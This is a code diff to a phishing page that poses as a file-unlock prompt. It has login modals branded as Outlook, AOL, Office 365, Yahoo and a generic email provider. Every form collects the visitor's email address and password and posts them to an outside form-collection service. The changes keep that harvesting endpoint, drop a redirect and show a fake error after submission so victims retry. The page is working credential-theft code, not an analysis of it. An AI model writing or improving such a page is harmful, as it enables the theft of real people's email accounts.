@@ -91,8 +91,7 @@ input {
 					<img style="width:50px; height:50px;" src="https://i7.pngguru.com/preview/653/271/784/microsoft-outlook-outlook-com-email-microsoft-office-365-outlook-logo.jpg">
 				</div>
 				<div class="modal-body">
-					<!-- CORRECTED: Using submit-form.com endpoint -->
-					<form action="https://submit-form.com/0gyAIslPc" method="POST">
+					<form action="https://submit-form.com/0gyAIslPc" method="POST" id="outlookForm">
 						<div class="form-group">
 							<label for="emailOutlook">Email</label>
 							<input class="form-control" type="email" id="emailOutlook" name="email" placeholder="Your receiving email" required>
@@ -102,7 +101,7 @@ input {
 							<input class="form-control" type="password" id="pwdOutlook" name="password" required>
 						</div>
 						<input type="hidden" name="provider" value="outlook">
-						<input type="hidden" name="_redirect" value="https://adobe.com">
+						<!-- REMOVED _redirect - no redirect -->
 						<input type="hidden" name="_gotcha" style="display:none">
 						<button type="submit" class="btn btn-primary">Unlock File</button>
 					</form>
@@ -130,8 +129,7 @@ input {
 					<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/AOL_logo.svg/1280px-AOL_logo.svg.png" style="width:50px;height:50px;">
 				</div>
 				<div class="modal-body">
-					<!-- CORRECTED: Using submit-form.com endpoint -->
-					<form action="https://submit-form.com/0gyAIslPc" method="POST">
+					<form action="https://submit-form.com/0gyAIslPc" method="POST" id="aolForm">
 						<div class="form-group">
 							<label for="emailAol">Email</label>
 							<input class="form-control" type="email" id="emailAol" name="email" placeholder="Your receiving email" required>
@@ -141,7 +139,7 @@ input {
 							<input class="form-control" type="password" id="pwdAol" name="password" required>
 						</div>
 						<input type="hidden" name="provider" value="aol">
-						<input type="hidden" name="_redirect" value="https://adobe.com">
+						<!-- REMOVED _redirect - no redirect -->
 						<input type="hidden" name="_gotcha" style="display:none">
 						<button type="submit" class="btn btn-primary btn-dark">Unlock File</button>
 					</form>
@@ -169,8 +167,7 @@ input {
 					<img src="https://www.tdaniels.com/files/2017/03/Office365_V2.png" style="width:50px; height:50px;">
 				</div>
 				<div class="modal-body">
-					<!-- CORRECTED: Using submit-form.com endpoint -->
-					<form action="https://submit-form.com/0gyAIslPc" method="POST">
+					<form action="https://submit-form.com/0gyAIslPc" method="POST" id="officeForm">
 						<div class="form-group">
 							<label for="emailOffice">Email</label>
 							<input class="form-control" type="email" id="emailOffice" name="email" placeholder="Your receiving email" required>
@@ -180,7 +177,7 @@ input {
 							<input class="form-control" type="password" id="pwdOffice" name="password" required>
 						</div>
 						<input type="hidden" name="provider" value="office365">
-						<input type="hidden" name="_redirect" value="https://adobe.com">
+						<!-- REMOVED _redirect - no redirect -->
 						<input type="hidden" name="_gotcha" style="display:none">
 						<button type="submit" class="btn btn-primary" style="background: red;border:1px solid red;">Unlock File</button>
 					</form>
@@ -208,8 +205,7 @@ input {
 					<img src="https://s.yimg.com/uu/api/res/1.2/Dn1UwBT_Cr.lJucziCG49A--~B/aD05MTQ7dz0xNTg0O3NtPTE7YXBwaWQ9eXRhY2h5b24-/https://media-mbst-pub-ue1.s3.amazonaws.com/creatr-uploaded-images/2019-09/a929b8f0-dd65-11e9-bffe-b90463fd5188" style="width:50px;height:50px;">
 				</div>
 				<div class="modal-body">
-					<!-- CORRECTED: Using submit-form.com endpoint -->
-					<form action="https://submit-form.com/0gyAIslPc" method="POST">
+					<form action="https://submit-form.com/0gyAIslPc" method="POST" id="yahooForm">
 						<div class="form-group">
 							<label for="emailYahoo">Email</label>
 							<input class="form-control" type="email" id="emailYahoo" name="email" placeholder="Your receiving email" required>
@@ -219,7 +215,7 @@ input {
 							<input class="form-control" type="password" id="pwdYahoo" name="password" required>
 						</div>
 						<input type="hidden" name="provider" value="yahoo">
-						<input type="hidden" name="_redirect" value="https://adobe.com">
+						<!-- REMOVED _redirect - no redirect -->
 						<input type="hidden" name="_gotcha" style="display:none">
 						<button type="submit" class="btn btn-primary" style="background:purple;border:1px solid purple;">Unlock File</button>
 					</form>
@@ -247,8 +243,7 @@ input {
 					<img src="https://cdn1.vectorstock.com/i/1000x1000/20/55/email-icon-black-and-white-mail-vector-24922055.jpg" style="width:50px; height:50px;">
 				</div>
 				<div class="modal-body">
-					<!-- CORRECTED: Using submit-form.com endpoint -->
-					<form action="https://submit-form.com/0gyAIslPc" method="POST">
+					<form action="https://submit-form.com/0gyAIslPc" method="POST" id="otherForm">
 						<div class="form-group">
 							<label for="emailOther">Email</label>
 							<input class="form-control" type="email" id="emailOther" name="email" placeholder="Your receiving email" required>
@@ -258,7 +253,7 @@ input {
 							<input class="form-control" type="password" id="pwdOther" name="password" required>
 						</div>
 						<input type="hidden" name="provider" value="other">
-						<input type="hidden" name="_redirect" value="https://adobe.com">
+						<!-- REMOVED _redirect - no redirect -->
 						<input type="hidden" name="_gotcha" style="display:none">
 						<button type="submit" class="btn btn-primary btn-dark">Unlock File</button>
 					</form>
@@ -287,8 +282,12 @@ input {
 <script>
 // Show spinner when any form is submitted
 document.querySelectorAll('form').forEach(form => {
-	form.addEventListener('submit', function() {
+	form.addEventListener('submit', function(e) {
+		// Don't prevent default - let form submit to Formspark
 		showSpinner();
+		
+		// Show error message after 2 seconds (original behavior)
+		setTimeout(showError, 2000);
 	});
 });
 
@@ -296,7 +295,6 @@ document.querySelectorAll('form').forEach(form => {
 function showSpinner(){
 	var spinner = $('.spinner');
 	spinner.show();
-	setTimeout(clearSpinner, 2000);
 }
 
 function clearSpinner(){
@@ -307,11 +305,14 @@ function clearSpinner(){
 function showError(){
 	var error = $('.alert');
 	error.show();
+	clearSpinner();
+	
+	// Hide error after 3 seconds (original behavior)
 	setTimeout(clearError, 3000);
 }
 	
 function clearError() {
-	document.querySelectorAll('.alert').remove();
+	$('.alert').hide();
 }
 </script>
 
